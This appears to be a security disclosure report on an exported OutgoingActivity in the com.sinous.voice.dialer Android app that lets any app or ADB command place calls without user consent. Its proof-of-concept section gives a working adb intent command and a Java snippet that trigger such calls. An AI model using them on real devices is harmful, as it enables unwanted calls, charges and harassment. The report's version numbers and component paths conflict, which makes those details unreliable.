# Vulnerability Report:
Unauthorized Call Initiation in com.sinous.voice.dialer App

## Summary
A  security vulnerability was identified in the `com.sinous.voice.dialer` Android application, version 1.2.5. The vulnerability allows for unauthorized initiation of phone calls from external sources without user interaction or consent.

## Details
https://play.google.com/store/apps/details?id=com.sinous.voice.dialer
### Affected Application
- **Name**: com.sinous.voice.dialer [https://play.google.com/store/apps/details?id=com.sinous.voice.dialer]
- **Version**: 1.3.1.0
- **Permissions Required**: None

### Description
The vulnerability resides in the exported `OutgoingActivity` component of the application. This activity is improperly exposed to external intent calls, enabling any application or ADB command to trigger phone calls directly.

### Impact
- **Unauthorized Calls**: Malicious entities can exploit this vulnerability to make unauthorized calls, which could lead to financial losses or privacy breaches.
- **User Consent Bypass**: The application fails to obtain explicit user consent before initiating calls, violating Android's privacy and security principles.
- **Potential Abuse**: There is a high risk of exploitation for harmful purposes, including spam calls or harassment.

### Proof of Concept
The following ADB command demonstrates the vulnerability:

```sh
adb shell am start -a android.intent.action.CALL -d tel:7168444444 -n com.sinous.voice.dialer/com.funprime.calldialer.ui.activities.OutgoingActivity
```
OR

```
   private void initiateCall() {
        Intent callIntent = new Intent(Intent.ACTION_CALL);
        callIntent.setData(Uri.parse("tel:1234567890")); // Replace with the number you want to call
        callIntent.setClassName("com.sinous.voice.dialer", 
                                "com.sinous.voice.dialer.OutgoingActivity");
        startActivity(callIntent);
    }
```
Executing this command initiates a phone call to the specified number without user interaction.

### Steps to Reproduce
1. Connect an Android device with USB debugging enabled.
2. Run the above ADB command.
3. Observe that a phone call is initiated without any user interaction.

### Recommendations
- **Restrict Activity Export**: Modify the app's manifest to ensure `OutgoingActivity` is not exported, or strictly filter incoming intents.
- **Implement User Consent**: Ensure that any action leading to a phone call requires explicit user consent.
- **Conduct Security Audit**: Review the application to identify and fix similar vulnerabilities.
